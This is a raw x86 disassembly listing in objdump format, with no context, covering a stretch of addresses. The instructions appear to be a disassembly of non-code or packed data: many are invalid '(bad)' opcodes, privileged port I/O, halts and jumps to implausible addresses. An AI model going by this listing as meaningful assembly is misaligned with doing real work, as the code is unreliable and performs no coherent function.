  41fd06:	shl    BYTE PTR [esi+eiz*8-0x50103312],0xf1
  41fd0e:	mov    al,0xd3
  41fd10:	fmulp  st(3),st
  41fd12:	int3   
  41fd13:	mov    edi,0x2ecfdf1
  41fd18:	mov    ebp,0xe601dfbc
  41fd1e:	jmp    esi
  41fd20:	(bad)  
  41fd22:	in     eax,dx
  41fd23:	stc    
  41fd24:	out    dx,al
  41fd25:	scas   al,BYTE PTR es:[edi]
  41fd26:	div    DWORD PTR [ebx-0x15243333]
  41fd2c:	call   0xd419b6fa
  41fd31:	cmc    
  41fd32:	int3   
  41fd33:	mov    ebx,0xe6ddb6e8
  41fd38:	cld    
  41fd39:	mov    esp,0xc9ffd5e5
  41fd3e:	hlt    
  41fd3f:	stc    
  41fd40:	retf   
  41fd41:	clc    
  41fd42:	(bad)  
  41fd44:	repz mov eax,0xc3b7aea5
  41fd4a:	out    0xf4,al
  41fd4c:	(bad)  
  41fd4d:	stc    
  41fd4e:	cmc    
  41fd4f:	mov    eax,0xcadab4e4
  41fd54:	cmc    
  41fd55:	cli    
  41fd56:	into   
  41fd57:	mov    ah,0x7
  41fd59:	mov    esp,0xf609dfd9
  41fd5e:	jmp    0xfb50c62d
  41fd63:	repnz stos BYTE PTR es:[edi],al
  41fd65:	mov    dl,0xe0
  41fd67:	lods   eax,DWORD PTR ds:[esi]
  41fd68:	retf   
  41fd69:	cmc    
  41fd6a:	(bad)
  41fd6d:	shl    ah,0xd0
  41fd70:	(bad)
  41fd73:	cli    
  41fd74:	hlt    
  41fd75:	sti    
  41fd76:	fnstsw WORD PTR [ebp-0x22002814]
  41fd7c:	rcl    esi,0xfe
  41fd7f:	fcmovnb st,st(3)
  41fd81:	or     ecx,eax
  41fd83:	fdivr  st(2),st
  41fd85:	rol    al,1
  41fd87:	mov    cl,0xcd
  41fd89:	stos   BYTE PTR es:[edi],al
  41fd8a:	ror    eax,1
  41fd8c:	out    dx,eax
  41fd8d:	lock jmp 0xbcf5:0xccf3d2c9
  41fd95:	cld    
  41fd96:	jecxz  0x41fd6c
  41fd98:	add    al,0xd3
  41fd9a:	loop   0x41fda3
  41fd9c:	neg    bl
  41fd9e:	(bad)  
  41fda0:	in     eax,dx
  41fda1:	enter  0xcdde,0xbe
  41fda5:	int3   
  41fda6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fda7:	rcl    bh,cl
  41fda9:	in     al,0xc2
  41fdab:	cmc    
  41fdac:	shr    bl,cl
  41fdae:	repnz shr bl,1
  41fdb1:	jecxz  0x41fd76
  41fdb3:	(bad)  
  41fdb5:	add    ah,al
  41fdb7:	fstp   st(1)
  41fdb9:	or     eax,edx
  41fdbb:	hlt    
  41fdbc:	(bad)  
  41fdbd:	sti    
  41fdbe:	cli    
  41fdbf:	loopne 0x41fd8b
  41fdc1:	hlt    
  41fdc2:	(bad)  
  41fdc3:	in     eax,0xcb
  41fdc5:	fild   QWORD PTR [ecx-0x1c301e40]
  41fdcb:	xlat   BYTE PTR ds:[ebx]
  41fdcc:	jmp    0xdf26c8b0
  41fdd1:	mov    ebp,0xf6ecfed4
  41fdd6:	xlat   BYTE PTR ds:[ebx]
  41fdd7:	add    BYTE PTR [ebx+eax*8-0x339fb1f],bh
  41fdde:	aad    0xc4
  41fde0:	lds    edx,FWORD PTR [ebx]
  41fde2:	retf   0xcb07
  41fde5:	(bad)  
  41fde6:	(bad)  
  41fde8:	in     al,0xf7
  41fdea:	call   0xb22fd8d6
  41fdef:	std    
  41fdf0:	hlt    
  41fdf1:	mov    ebx,0xfdd8dcb4
  41fdf6:	(bad)  
  41fdf7:	rcr    ch,1
  41fdf9:	add    BYTE PTR [ebx],al
  41fdfb:	aam    0xdc
  41fdfd:	loop   0x41fdea
  41fdff:	or     ecx,DWORD PTR [ebx]
  41fe01:	stc    
  41fe02:	fchs   
  41fe04:	iret   
  41fe05:	mov    esi,0xedddf5e5
  41fe0a:	repnz retf 
  41fe0c:	mov    al,0xee
  41fe0e:	hlt    
  41fe0f:	out    dx,eax
  41fe10:	jmp    0xe917dd08
  41fe15:	ret    0xdeee
  41fe18:	(bad)  
  41fe19:	mov    ebp,0xf8dd05fa
  41fe1e:	add    al,bl
  41fe20:	call   0xf133e907
  41fe25:	call   0xb711ed06
  41fe2a:	(bad)  
  41fe2b:	mov    ch,0xcc
  41fe2d:	(bad)  
  41fe2f:	iret   
  41fe30:	leave  
  41fe31:	retf   0xd9f7
  41fe34:	cmc    
  41fe35:	mov    eax,0xf2e4e3e0
  41fe3a:	(bad)  
  41fe3b:	jmp    0x80de60b
  41fe40:	in     al,0xce
  41fe42:	add    dh,bh
  41fe44:	retf   
  41fe45:	(bad)  
  41fe46:	int3   
  41fe47:	mov    dh,0xe1
  41fe49:	jmp    0xf6f4f020
  41fe4e:	retf   
  41fe4f:	lds    esi,FWORD PTR [ebx-0x36092d11]
  41fe55:	mov    dh,0xc0
  41fe57:	out    0xbe,al
  41fe59:	neg    dl
  41fe5b:	cmc    
  41fe5c:	loop   0x41fe1e
  41fe5e:	aad    0xf6
  41fe60:	add    bl,bh
  41fe62:	adc    al,BYTE PTR [edi]
  41fe64:	fxch   st(5)
  41fe66:	in     eax,dx
  41fe67:	ret    0xecb2
  41fe6a:	into   
  41fe6b:	sti    
  41fe6c:	mov    cl,0xc7
  41fe6e:	fcomip st,st(0)
  41fe70:	ror    dh,1
  41fe72:	xlat   BYTE PTR ds:[ebx]
  41fe73:	mov    esi,0x2dadaf2
  41fe78:	sar    cl,cl
  41fe7a:	sti    
  41fe7b:	cli    
  41fe7c:	lds    eax,FWORD PTR [edi]
  41fe7e:	retf   0x1f8
  41fe81:	out    0xa,al
  41fe83:	into   
  41fe84:	enter  0xf0e7,0xe8
  41fe88:	ror    ebp,1
  41fe8a:	lock jmp 0xd315c364
  41fe90:	sar    DWORD PTR [ecx-0xf3c2930],1
  41fe96:	repz fsubr st(2),st
  41fe99:	in     al,dx
  41fe9a:	(bad)  
  41fe9b:	fucom  st(6)
  41fe9d:	xlat   BYTE PTR ds:[ebx]
  41fe9e:	pop    es
  41fe9f:	push   es
  41fea0:	stc    
  41fea1:	std    
  41fea2:	int3   
  41fea3:	cld    
  41fea4:	leave  
  41fea5:	stos   BYTE PTR es:[edi],al
  41fea6:	rol    ecx,0xc9
  41fea9:	repz in eax,dx
  41feab:	lods   al,BYTE PTR ds:[esi]
  41feac:	icebp  
  41fead:	into   
  41feae:	in     eax,0xcb
  41feb0:	(bad)  
  41feb1:	repnz fcomi st,st(4)
  41feb4:	loop   0x41feb8
  41feb6:	(bad)  
  41feb8:	push   es
  41feb9:	sti    
  41feba:	hlt    
  41febb:	ror    BYTE PTR [ecx],0xf7
  41febe:	push   es
  41febf:	loop   0x41feaf
  41fec1:	fnstsw ax
  41fec3:	leave  
  41fec4:	jecxz  0x41fe74
  41fec6:	mov    cl,0xe2
  41fec8:	in     al,dx
  41fec9:	repnz mov bh,0xc9
  41fecc:	mov    bh,0xba
  41fece:	bnd jmp 0x41fec5
  41fed1:	mov    esi,0xb9bcfcb5
  41fed6:	hlt    
  41fed7:	loopne 0x41feba
  41fed9:	icebp  
  41feda:	stc    
  41fedb:	mov    esp,0xe7e2e5e4
  41fee1:	(bad)
  41fee4:	repz fsubr QWORD PTR [esi-0x332f3918]
  41feeb:	leave  
  41feec:	enter  0xcbae,0xd5
  41fef0:	retf   
  41fef1:	fxch   st(2)
  41fef3:	cmc    
  41fef4:	repnz sar eax,1
  41fef7:	div    ch
  41fef9:	fcomip st,st(1)
  41fefb:	xlat   BYTE PTR ds:[ebx]
  41fefc:	add    eax,0xeae7eb03
  41ff01:	int3   
  41ff02:	jmp    0xc912acf6
  41ff07:	ret    
  41ff08:	int3   
  41ff09:	hlt    
  41ff0a:	icebp  
  41ff0b:	mov    ah,0xb4
  41ff0d:	icebp  
  41ff0e:	(bad)  
  41ff0f:	mov    ah,0xb7
  41ff11:	in     eax,dx
  41ff12:	int    0xf4
  41ff14:	mov    ecx,0xf1b8dfc8
  41ff19:	(bad)  
  41ff1a:	(bad)  
  41ff1b:	fcom   st(4)
  41ff1d:	push   es
  41ff1e:	clc    
  41ff1f:	(bad)  
  41ff20:	std    
  41ff21:	repz loopne 0x41ff21
  41ff24:	lods   al,BYTE PTR ds:[esi]
  41ff25:	iret   
  41ff26:	mov    cl,0xb6
  41ff28:	cmc    
  41ff29:	enter  0xf3c2,0xe6
  41ff2d:	(bad)  
  41ff2f:	clc    
  41ff30:	into   
  41ff31:	hlt    
  41ff32:	enter  0xdbfe,0xe1
  41ff36:	ret    
  41ff37:	rol    DWORD PTR [esi+edx*8],cl
  41ff3a:	icebp  
  41ff3b:	test   BYTE PTR [ebx],0xdb
  41ff3e:	out    0xe4,eax
  41ff40:	in     eax,0xff
  41ff42:	sti    
  41ff43:	icebp  
  41ff44:	into   
  41ff45:	in     al,0xef
  41ff47:	loop   0x41ff3d
  41ff49:	mov    cl,0xa9
  41ff4b:	(bad)  
  41ff4c:	in     eax,dx
  41ff4d:	mov    dl,0xb1
  41ff4f:	stc    
  41ff50:	rcl    bl,cl
  41ff52:	in     al,dx
  41ff53:	aam    0xfa
  41ff55:	repz cli 
  41ff57:	cld    
  41ff58:	fcmovnb st,st(0)
  41ff5a:	fcmovnbe st,st(5)
  41ff5c:	out    0xf8,eax
  41ff5e:	fisttp QWORD PTR ds:0xc8d9fde7
  41ff64:	(bad)  
  41ff65:	loopne 0x41ff0c
  41ff67:	(bad)  
  41ff68:	out    0xf0,eax
  41ff6a:	in     al,dx
  41ff6b:	in     al,0xcd
  41ff6d:	rcl    ch,0xfe
  41ff70:	lds    edi,FWORD PTR [esi-0x492e4742]
  41ff76:	out    0xda,al
  41ff78:	loopne 0x41ff37
  41ff7a:	loop   0x41ff78
  41ff7c:	hlt    
  41ff7d:	fsub   st(2),st
  41ff7f:	push   cs
  41ff80:	fmul   st(7),st
  41ff82:	fucomi st,st(7)
  41ff84:	mov    esi,0xaea4a5e2
  41ff89:	loopne 0x41ff34
  41ff8b:	not    esi
  41ff8d:	(bad)  
  41ff8e:	stc    
  41ff8f:	clc    
  41ff90:	(bad)  
  41ff92:	stc    
  41ff93:	fcomp  st(1)
  41ff95:	fldlg2 
  41ff97:	shl    ecx,cl
  41ff99:	add    dl,ch
  41ff9b:	out    0xe9,eax
  41ff9d:	out    dx,eax
  41ff9e:	(bad)  
  41ff9f:	out    dx,eax
  41ffa0:	pop    es
  41ffa1:	out    dx,eax
  41ffa2:	add    al,0xd9
  41ffa4:	mov    edi,0xb6f5caf0
  41ffa9:	aam    0xe1
  41ffab:	loop   0x41ff85
  41ffad:	in     eax,0xee
  41ffaf:	rcl    esp,1
  41ffb1:	cli    
  41ffb2:	mov    ah,0xca
  41ffb4:	leave  
  41ffb5:	sti    
  41ffb6:	pop    es
  41ffb7:	fcomi  st,st(4)
  41ffb9:	cld    
  41ffba:	jmp    0x41ff74
  41ffbc:	inc    DWORD PTR [ecx]
  41ffbe:	jmp    0x41ff8e
  41ffc0:	(bad)  
  41ffc1:	stc    
  41ffc2:	or     esp,esp
  41ffc4:	out    0xe0,eax
  41ffc6:	jmp    0xb4eeb596
  41ffcb:	enter  0xe7c5,0xea
  41ffcf:	(bad)  
  41ffd1:	iret   
  41ffd2:	iret   
  41ffd3:	fsubrp st(2),st
  41ffd5:	add    edi,DWORD PTR [edi-0x2e29f82c]
  41ffdb:	or     ah,dh
  41ffdd:	loopne 0x41ffc2
  41ffdf:	or     eax,0xcfe5dc06
  41ffe4:	loopne 0x41ffd7
  41ffe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffe7:	rcl    esi,0xd0
  41ffea:	(bad)  
  41ffeb:	icebp  
  41ffec:	jmp    0x41ffdd
  41ffee:	idiv   eax
  41fff0:	retf   0xbdff
  41fff3:	add    edx,esi
  41fff5:	ret    0x5c2
  41fff8:	(bad)  
  41fffa:	loop   0x420006
  41fffc:	ret    
  41fffd:	(bad)  
  41fffe:	stc    
  41ffff:	fcmovu st,st(5)
  420001:	in     eax,0xf9
  420003:	adc    eax,edx
  420005:	test   ebp,0xcec3e3b1
  42000b:	xlat   BYTE PTR ds:[ebx]
  42000c:	fcom   st(5)
  42000e:	cli    
  42000f:	mov    bh,0xbd
  420011:	(bad)  
  420012:	fdivr  st,st(1)
  420014:	mov    ecx,0xf0dde2f8
  420019:	fst    st(7)
  42001b:	lock icebp 
  42001d:	(bad)  
  42001e:	mul    ecx
  420020:	retf   
  420021:	or     eax,0xb2d9fddc
  420026:	mov    esi,0xa9e0eaee
  42002b:	in     eax,dx
  42002c:	leave  
  42002d:	jmp    0xf3ed:0xeab7b7d1
  420034:	ret    
  420035:	lock (bad) 
  420037:	xlat   BYTE PTR ds:[ebx]
  420038:	add    ch,bl
  42003a:	fiadd  DWORD PTR [ebx]
  42003c:	rcr    cl,0xd4
  42003f:	(bad)  
  420040:	int    0xf3
  420042:	add    ebp,ecx
  420044:	test   al,0xe0
  420046:	repz enter 0xc2d0,0xd6
  42004b:	shr    edx,1
  42004d:	call   0xbb36ec1c
  420052:	fcomip st,st(5)
  420054:	fdiv   st,st(1)
  420056:	cli    
  420057:	push   es
  420058:	fcmovb st,st(1)
  42005a:	fsubrp st(3),st
  42005c:	add    al,0x9
  42005e:	neg    edx
  420060:	(bad)
  420063:	loop   0x420024
  420065:	shl    bl,cl
  420067:	cmc    
  420068:	ret    
  420069:	mov    cl,0xc5
  42006b:	loop   0x42005c
  42006d:	lock rcl ebx,cl
  420070:	(bad)  
  420071:	fxtract 
  420073:	mov    ebp,0xf1ecccd1
  420078:	in     al,dx
  420079:	loop   0x42003d
  42007b:	or     ebp,eax
  42007d:	leave  
  42007e:	(bad)  
  42007f:	hlt    
  420080:	stc    
  420081:	in     eax,dx
  420082:	sti    
  420083:	cli    
  420084:	sar    DWORD PTR [esi-0xa233c24],1
  42008a:	lock mov cl,0xb9
  42008d:	retf   
  42008e:	hlt    
  42008f:	iret   
  420090:	mov    ch,0xcb
  420092:	mov    ebx,0xc1f3d5da
  420097:	aam    0xc2
  420099:	int3   
  42009a:	pop    es
  42009b:	add    edx,ebx
  42009d:	fsub   st(2),st
  42009f:	cli    
  4200a0:	fadd   st(5),st
  4200a2:	out    0xec,al
  4200a4:	loop   0x420082
  4200a6:	retf   0xd0f7
  4200a9:	mov    bh,0xd1
  4200ab:	in     eax,dx
  4200ac:	cli    
  4200ad:	rcr    al,cl
  4200af:	fnstenv [esp+ebx*8-0xa30fc18]
  4200b6:	sti    
  4200b7:	repnz int3 
  4200b9:	add    ah,al
  4200bb:	add    al,0xc7
  4200bd:	neg    ah
  4200bf:	add    edi,ebx
  4200c1:	add    eax,0xeec4c9fb
  4200c6:	loop   0x4200b3
  4200c8:	mov    esp,0xd7b0ecac
  4200cd:	scas   al,BYTE PTR es:[edi]
  4200ce:	out    0xfa,al
  4200d0:	mov    dh,0xf2
  4200d2:	leave  
  4200d3:	rcl    ecx,1
  4200d5:	loope  0x4200b5
  4200d7:	loope  0x4200bb
  4200d9:	in     al,dx
  4200da:	jecxz  0x4200d2
  4200dc:	add    bl,dh
  4200de:	aam    0xc4
  4200e0:	cli    
  4200e1:	jmp    0xc8f005aa
  4200e6:	(bad)  
  4200e8:	loopne 0x4200bf
  4200ea:	repnz mov dl,0xda
  4200ed:	into   
  4200ee:	mov    cl,0xdf
  4200f0:	retf   0xded8
  4200f3:	hlt    
  4200f4:	jecxz  0x4200d5
  4200f6:	mul    bl
  4200f8:	(bad)  
  4200fa:	fcomp  st(2)
  4200fc:	mov    edi,0xe3f800c7
  420101:	call   DWORD PTR [edx]
  420103:	out    0xec,al
  420105:	mov    ebp,0xebe5adae
  42010a:	shl    dh,1
  42010c:	shl    DWORD PTR [esi-0x43032635],1
  420112:	out    dx,eax
  420113:	out    dx,eax
  420114:	int3   
  420115:	loopne 0x4200ed
  420117:	clc    
  420118:	mul    bl
  42011a:	or     bh,bh
  42011c:	call   0xdc0805eb
  420121:	loopne 0x420123
  420123:	bnd jmp 0x4200f5
  420126:	out    0xc2,eax
  420128:	shl    ah,cl
  42012a:	not    ebp
  42012c:	aam    0xf9
  42012e:	mov    ecx,0xd4d3ead3
  420133:	int    0x0
  420135:	rcr    ah,cl
  420137:	faddp  st(1),st
  420139:	cld    
  42013a:	sar    bl,cl
  42013c:	sti    
  42013d:	out    0xf9,eax
  42013f:	add    ch,cl
  420141:	out    dx,eax
  420142:	in     eax,0xf3
  420144:	les    ebp,FWORD PTR [eax-0x1b2b150e]
  42014a:	into   
  42014b:	mov    bl,0xea
  42014d:	rol    ah,0xef
  420150:	jmp    0x42014c
  420152:	(bad)  
  420153:	icebp  
  420154:	mov    bh,0xce
  420156:	mov    ch,0xb8
  420158:	inc    ebp
  42015a:	ror    bl,0xfc
  42015d:	inc    BYTE PTR [ebx]
  42015f:	jmp    0xdfd8:0x1300cac4
  420166:	mov    bl,0xe9
  420168:	ret    0xd2ec
  42016b:	mov    bl,0xb6
  42016d:	out    dx,al
  42016e:	in     eax,dx
  42016f:	fcmove st,st(4)
  420171:	in     eax,dx
  420172:	fdivr  st(6),st
  420174:	loopne 0x42012c
  420176:	mov    esi,0xfdd9d4ec
  42017b:	jmp    0x420165
  42017d:	sar    ebx,0xda
  420180:	retf   0x207
  420183:	push   es
  420184:	mov    cl,0xe7
  420186:	lods   eax,DWORD PTR ds:[esi]
  420187:	enter  0xefc7,0xb0
  42018b:	repz (bad) 
  42018d:	int3   
  42018e:	into   
  42018f:	jmp    0x2fb:0xdbe3d4b7
  420196:	ret    
  420197:	add    ecx,esp
  420199:	cld    
  42019a:	div    dh
  42019c:	sti    
  42019d:	out    dx,eax
  42019e:	loopne 0x420188
  4201a0:	leave  
  4201a1:	leave  
  4201a2:	adc    ah,ah
  4201a4:	fxam   
  4201a6:	lock (bad) 
  4201a8:	out    0xb6,eax
  4201aa:	(bad)  
  4201ac:	out    0xd8,al
  4201ae:	mov    eax,0xccb6cfc4
  4201b3:	icebp  
  4201b4:	add    dl,dh
  4201b6:	clc    
  4201b7:	mov    esp,0xead2ccbd
  4201bc:	fsubr  st,st(2)
  4201be:	fdivr  st,st(4)
  4201c0:	add    al,dl
  4201c2:	leave  
  4201c3:	or     ch,BYTE PTR [edx-0x2e18481b]
  4201c9:	mov    bh,0xb0
  4201cb:	shl    ecx,cl
  4201cd:	(bad)  
  4201d0:	clc    
  4201d1:	leave  
  4201d2:	int    0xbe
  4201d4:	shl    al,1
  4201d6:	(bad)  
  4201d7:	add    ebx,ebp
  4201d9:	add    eax,0xf4c9f1d1
  4201de:	call   0xb2b0ccd
  4201e3:	cli    
  4201e4:	rcl    bh,0xe5
  4201e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201e8:	stos   DWORD PTR es:[edi],eax
  4201e9:	mov    esp,0xf7f0b1c4
  4201ee:	xlat   BYTE PTR ds:[ebx]
  4201ef:	(bad)  
  4201f0:	enter  0xb1c9,0xd1
  4201f4:	icebp  
  4201f5:	out    dx,eax
  4201f6:	in     eax,dx
  4201f7:	not    cl
  4201f9:	cli    
  4201fa:	lock aam 0xc7
  4201fd:	add    eax,ecx
  4201ff:	add    al,0x2
  420201:	fdivr  st,st(4)
  420203:	clc    
  420204:	mov    esp,0xedeae7c7
  420209:	(bad)  [edi-0x40254839]
  42020f:	in     al,0xfc
  420211:	clc    
  420212:	ret    
  420213:	(bad)  
  420215:	fchs   
  420217:	rcr    dl,cl
  420219:	(bad)  
  42021b:	(bad)  
  42021c:	aad    0xfe
  42021e:	in     al,0xee
  420220:	(bad)  
  420221:	jmp    0x420210
  420223:	or     eax,0xe0b3e1c2
  420228:	fucom  st(2)
  42022a:	out    0xb2,al
  42022c:	jmp    0x42021b
  42022e:	jmp    0x420221
  420230:	jmp    0xc14601fe
  420235:	int3   
  420236:	loop   0x420235
  420238:	icebp  
  420239:	dec    bl
  42023b:	or     DWORD PTR [edi],eax
  42023d:	fsubp  st(0),st
  42023f:	retf   0xc204
  420242:	enter  0xab12,0xe7
  420246:	int    0xb1
  420248:	rcl    eax,0xb7
  42024b:	out    0xca,al
  42024d:	shr    ebp,1
  42024f:	leave  
  420250:	repnz mov ebp,0xc8fff3b4
  420256:	mov    ch,0xdc
  420258:	loop   0x420240
  42025a:	stc    
  42025b:	loopne 0x420267
  42025d:	shl    bh,1
  42025f:	(bad)  
  420260:	(bad)  
  420262:	(bad)  
  420264:	jmp    0xd4f0f318
  420269:	(bad)  
  42026a:	test   eax,0xd6fbe5c2
  42026f:	mov    ch,0xca
  420271:	fcmovb st,st(3)
  420273:	enter  0xe0c3,0xde
  420277:	sar    dh,0xd0
  42027a:	push   es
  42027b:	jmp    0xdb110341
  420280:	(bad)  
  420281:	in     al,0x4
  420283:	stc    
  420284:	jmp    0xd40bf16b
  420289:	out    0xb3,eax
  42028b:	loopne 0x420254
  42028d:	repz aam 0xd5
  420290:	mov    dh,0xcb
  420292:	repz (bad) 
  420294:	mov    bh,0xd2
  420296:	cld    
  420297:	(bad)  
  420299:	(bad)  
  42029c:	or     edx,ebx
  42029e:	retf   
  42029f:	(bad)  
  4202a0:	hlt    
  4202a1:	loop   0x42028a
  4202a3:	out    dx,eax
  4202a4:	iret   
  4202a5:	enter  0xbce4,0xe7
  4202a9:	jecxz  0x420261
  4202ab:	out    0xd4,al
  4202ad:	hlt    
  4202ae:	mov    cl,0xc6
  4202b0:	cmc    
  4202b1:	jmp    0x42028b
  4202b3:	rcl    edi,cl
  4202b5:	fistp  QWORD PTR [ebp-0x27f90523]
  4202bb:	(bad)  
  4202bc:	fdivr  st(7),st
  4202be:	aad    0xfe
  4202c0:	fmul   st(6),st
  4202c2:	cld    
  4202c3:	jmp    0xe52dc270
  4202c8:	loopne 0x420286
  4202ca:	in     eax,dx
  4202cb:	out    0xe5,al
  4202cd:	div    al
  4202cf:	div    dl
  4202d1:	mov    ah,0xd6
  4202d3:	fcomi  st,st(2)
  4202d5:	(bad)  
  4202d6:	stc    
  4202d7:	(bad)  
  4202d8:	rol    BYTE PTR [ecx],cl
  4202da:	idiv   cl
  4202dc:	ret    
  4202dd:	add    dh,bl
  4202df:	or     al,BYTE PTR [esp+ebp*8]
  4202e2:	or     dl,dl
  4202e4:	leave  
  4202e5:	(bad)  
  4202e6:	out    0xf6,al
  4202e8:	(bad)
  4202ec:	into   
  4202ed:	jmp    0x4202db
  4202ef:	mov    dh,0xde
  4202f1:	rcl    eax,cl
  4202f3:	fucomip st,st(7)
  4202f5:	call   0xff3cd1ee
  4202fa:	loopne 0x4202bd
  4202fc:	call   0xec26d7fb
  420301:	stc    
  420302:	into   
  420303:	fisubr WORD PTR [edi+eiz*8-0x14313629]
  42030a:	iret   
  42030b:	in     eax,0xc7
  42030d:	mov    ch,0xbb
  42030f:	in     eax,0xb6
  420311:	retf   
  420312:	jmp    0xce31f0eb
  420317:	shr    ebp,cl
  420319:	faddp  st(5),st
  42031b:	fld    st(3)
  42031d:	fld    st(6)
  42031f:	into   
  420320:	bswap  edi
  420322:	leave  
  420323:	loop   0x4202de
  420325:	mov    esi,0xc1b7d1af
  42032a:	in     eax,0xc4
  42032c:	cmc    
  42032d:	in     al,dx
  42032e:	in     al,dx
  42032f:	dec    bl
  420331:	mov    ch,0xff
  420333:	(bad)  
  420334:	repnz stc 
  420336:	icebp  
  420337:	mov    esi,0xd2c4f2e0
  42033c:	sti    
  42033d:	(bad)  
  42033e:	loopne 0x420327
  420340:	leave  
  420341:	sti    
  420342:	add    eax,0xf0c0abc4
  420347:	sar    BYTE PTR [ebp+ebp*8-0x2a2c0e2d],1
  42034e:	(bad)  
  42034f:	bnd call 0xef2ce732
  420355:	ret    
  420356:	shl    BYTE PTR [edi+eax*1-0x2b351508],cl
  42035d:	leave  
  42035e:	jmp    0xe448eb2c
  420363:	into   
  420364:	(bad)  
  420365:	retf   
  420366:	loopne 0x42031a
  420368:	ror    esp,1
  42036a:	repnz test al,0xba
  42036d:	enter  0xd9b8,0xef
  420371:	jecxz  0x420343
  420373:	aam    0xd1
  420375:	out    0xfc,eax
  420377:	(bad)  
  420379:	rol    BYTE PTR [eax],0xfe
  42037c:	or     ch,bl
  42037e:	fsub   st,st(1)
  420380:	in     al,dx
  420381:	in     al,0xcf
  420383:	or     eax,esp
  420385:	int    0xe5
  420387:	(bad)  
  420388:	repz mov ah,0xea
  42038b:	in     eax,dx
  42038c:	int3   
  42038d:	sti    
  42038e:	test   eax,0x1d4f6f8
  420394:	icebp  
  420395:	mov    esp,0xf9fff9fe
  42039a:	(bad)  
  42039c:	(bad)  
  42039e:	aam    0xfb
  4203a0:	retf   
  4203a1:	out    0xdf,al
  4203a3:	shl    dl,0xbd
  4203a6:	repz in al,dx
  4203a8:	int3   
  4203a9:	jmp    0xd5c7:0xecd1f4e4
  4203b0:	mov    ecx,0xe8b9d3fc
  4203b5:	mov    ebp,0xfcd2dac0
  4203ba:	add    esi,ebp
  4203bc:	stc    
  4203bd:	ret    0xdfff
  4203c0:	or     ebx,ebp
  4203c2:	int3   
  4203c3:	in     eax,0xe5
  4203c5:	test   eax,0xc0e6dcc9
  4203ca:	jmp    0x420395
  4203cc:	scas   eax,DWORD PTR es:[edi]
  4203cd:	retf   0xdbf3
  4203d0:	hlt    
  4203d1:	sar    BYTE PTR [ebx-0xb252b1d],cl
  4203d7:	add    ecx,edx
  4203d9:	add    eax,esi
  4203db:	jecxz  0x4203a0
  4203dd:	push   es
  4203de:	(bad)  
  4203df:	retf   0xcfdf
  4203e2:	fmulp  st(1),st
  4203e4:	fucom  st(2)
  4203e6:	in     eax,dx
  4203e7:	lods   eax,DWORD PTR ds:[esi]
  4203e8:	imul   bl
  4203ea:	xlat   BYTE PTR ds:[ebx]
  4203eb:	div    eax
  4203ed:	mov    ebx,0xfbbeeff0
  4203f2:	clc    
  4203f3:	icebp  
  4203f4:	mov    esp,0xf2f8e6d9
  4203f9:	(bad)  
  4203fa:	cli    
  4203fb:	rcr    al,1
  4203fd:	std    
  4203fe:	(bad)  
  4203ff:	or     eax,0xfccc09e4
  420404:	stos   BYTE PTR es:[edi],al
  420405:	lds    esi,FWORD PTR [edx-0x3c23091b]
  42040b:	rol    ebp,0xb8
  42040e:	rcl    bh,1
  420410:	in     al,dx
  420411:	iret   
  420412:	inc    dl
  420414:	loope  0x42040d
  420416:	out    0xd1,eax
  420418:	add    bh,ah
  42041a:	in     al,0xbc
  42041c:	out    0xe0,al
  42041e:	fsubrp st(1),st
  420420:	retf   
  420421:	or     al,0xcf
  420423:	cld    
  420424:	(bad)  
  420425:	icebp  
  420426:	jecxz  0x4203eb
  420428:	repz retf 0xc7cf
  42042c:	fcomi  st,st(2)
  42042e:	mov    edx,0xfed3f1f6
  420433:	jecxz  0x42042f
  420435:	mov    ebp,0xd9bdbfbc
  42043a:	or     ah,cl
  42043c:	clc    
  42043d:	out    0xe1,eax
  42043f:	(bad)
  420443:	adc    ebx,esp
  420445:	shr    esi,cl
  420447:	mov    ebp,0xeeead1b6
  42044c:	mov    dl,0xfa
  42044e:	xlat   BYTE PTR ds:[ebx]
  42044f:	int    0xde
  420451:	div    esp
  420453:	add    ecx,edi
  420455:	hlt    
  420456:	ret    0xfbe3
  420459:	mov    ebp,0xd7fbd70a
  42045e:	add    al,0xe0
  420460:	push   es
  420461:	add    BYTE PTR ds:0xc5dff0dc,al
  420467:	call   0xc23deb61
  42046c:	jmp    0xf136cb5f
  420471:	fdiv   st(5),st
  420473:	jecxz  0x42044f
  420475:	loope  0x420470
  420477:	(bad)  
  420478:	int3   
  420479:	out    0xfb,al
  42047b:	inc    DWORD PTR [edx]
  42047d:	imul   dl
  42047f:	in     al,0xda
  420481:	jmp    0xd933e28b
  420486:	lods   eax,DWORD PTR ds:[esi]
  420487:	loope  0x420451
  420489:	jmp    0x420461
  42048b:	mov    bh,0xce
  42048d:	mov    eax,0xf5f3b6e4
  420492:	lock mov edx,0xd8bdd9d8
  420498:	int3   
  420499:	(bad)  
  42049a:	mov    ebp,0xc7fcd1fb
  42049f:	or     bl,bh
  4204a1:	aam    0xc9
  4204a3:	or     al,bl
  4204a5:	loope  0x42046f
  4204a7:	(bad)  
  4204a9:	hlt    
  4204aa:	jecxz  0x420470
  4204ac:	in     al,0xf3
  4204ae:	out    0xc5,eax
  4204b0:	std    
  4204b1:	iret   
  4204b2:	bnd ret 
  4204b4:	lock stc 
  4204b6:	add    dh,al
  4204b8:	(bad)  
  4204ba:	loop   0x4204c0
  4204bc:	dec    DWORD PTR [edx]
  4204be:	sar    edx,0x4
  4204c1:	adc    eax,DWORD PTR [edi]
  4204c3:	or     BYTE PTR [esi-0x2f18281f],bh
  4204c9:	mov    bh,0xeb
  4204cb:	ret    0xd5ca
  4204ce:	shl    ch,1
  4204d0:	jmp    0xcd1dd1c2
  4204d5:	add    bh,dh
  4204d7:	loop   0x4204d2
  4204d9:	fcomp  st(3)
  4204db:	(bad)  
  4204dc:	jmp    0x4240cd7
  4204e1:	jmp    0xe93208b1
  4204e6:	scas   eax,DWORD PTR es:[edi]
  4204e7:	bnd ret 
  4204e9:	mov    dl,0xef
  4204eb:	loopne 0x4204c6
  4204ed:	(bad)  
  4204ee:	mov    edx,0xb4fbf4e5
  4204f3:	loop   0x4204e4
  4204f5:	test   BYTE PTR [ecx],0xc6
  4204f8:	jecxz  0x4204be
  4204fa:	ffree  st(1)
  4204fc:	loope  0x4204f2
  4204fe:	loopne 0x42050b
  420500:	in     eax,dx
  420501:	push   es
  420502:	fxch   st(0)
  420504:	shr    DWORD PTR [ebp-0x324d383c],cl
  42050a:	(bad)  
  42050b:	call   0xdc0cf0fb
  420510:	(bad)  
  420511:	fidivr DWORD PTR [ecx-0x4733fc46]
